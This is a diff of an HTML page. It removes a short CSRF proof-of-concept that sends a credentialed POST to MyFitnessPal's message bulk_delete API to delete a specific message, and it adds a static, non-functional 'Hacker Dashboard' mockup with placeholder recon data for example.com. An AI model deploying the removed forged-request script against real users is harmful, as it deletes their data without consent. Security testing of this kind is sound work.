@@ -1,19 +1,81 @@
-<html>
-  <body>
-    <script>
-      fetch("https://www.myfitnesspal.com/api/services/messages/bulk_delete", {
-        method: "POST",
-        credentials: "include",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          item: [216410201],
-          sent: false
-        })
-      }).then(response => response.text())
-        .then(data => console.log(data));
-    </script>
-    <h1>CSRF Attempt Sent</h1>
-  </body>
+<!DOCTYPE html>
+<html lang="en" class="bg-gray-900 text-white">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hacker Dashboard</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="flex h-screen">
+  
+  <!-- Sidebar -->
+  <div class="w-64 bg-gray-800 p-4 flex flex-col">
+    <h1 class="text-2xl font-bold text-green-400 mb-6">Hacker Dashboard</h1>
+    <nav class="space-y-3">
+      <a href="#" class="block p-2 rounded hover:bg-gray-700">Dashboard</a>
+      <a href="#" class="block p-2 rounded hover:bg-gray-700">Targets</a>
+      <a href="#" class="block p-2 rounded hover:bg-gray-700">Tools</a>
+      <a href="#" class="block p-2 rounded hover:bg-gray-700">Vulnerability Tracker</a>
+      <a href="#" class="block p-2 rounded hover:bg-gray-700">Settings</a>
+    </nav>
+  </div>
+  
+  <!-- Main Content -->
+  <div class="flex-1 p-6 overflow-auto">
+    
+    <!-- Stat Cards -->
+    <div class="grid grid-cols-4 gap-4 mb-6">
+      <div class="bg-gray-800 p-4 rounded shadow">
+        <h2 class="text-sm text-gray-400">Total Targets</h2>
+        <p class="text-2xl font-bold">12</p>
+      </div>
+      <div class="bg-gray-800 p-4 rounded shadow">
+        <h2 class="text-sm text-gray-400">Open Ports</h2>
+        <p class="text-2xl font-bold">87</p>
+      </div>
+      <div class="bg-gray-800 p-4 rounded shadow">
+        <h2 class="text-sm text-gray-400">High Severity Bugs</h2>
+        <p class="text-2xl font-bold">5</p>
+      </div>
+      <div class="bg-gray-800 p-4 rounded shadow">
+        <h2 class="text-sm text-gray-400">Last Scan</h2>
+        <p class="text-2xl font-bold">08 Aug 2025</p>
+      </div>
+    </div>
+
+    <!-- Recon Table -->
+    <div class="bg-gray-800 p-4 rounded shadow mb-6">
+      <h2 class="text-lg font-bold mb-4">Recon Results</h2>
+      <table class="w-full text-left">
+        <thead>
+          <tr class="border-b border-gray-700">
+            <th class="p-2">Target</th>
+            <th class="p-2">Status</th>
+            <th class="p-2">Open Ports</th>
+            <th class="p-2">Bugs Found</th>
+            <th class="p-2">Actions</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr class="border-b border-gray-700">
+            <td class="p-2">example.com</td>
+            <td class="p-2 text-green-400">Active</td>
+            <td class="p-2">5</td>
+            <td class="p-2 text-red-400">2</td>
+            <td class="p-2"><button class="bg-green-500 px-2 py-1 rounded">Scan</button></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- Terminal Logs -->
+    <div class="bg-black p-4 rounded shadow font-mono text-green-400 h-48 overflow-y-auto">
+      > Initializing recon...
+      <br>> Subfinder running on target: example.com
+      <br>> Found 5 subdomains.
+      <br>> Nmap scan complete.
+    </div>
+
+  </div>
+</body>
 </html>
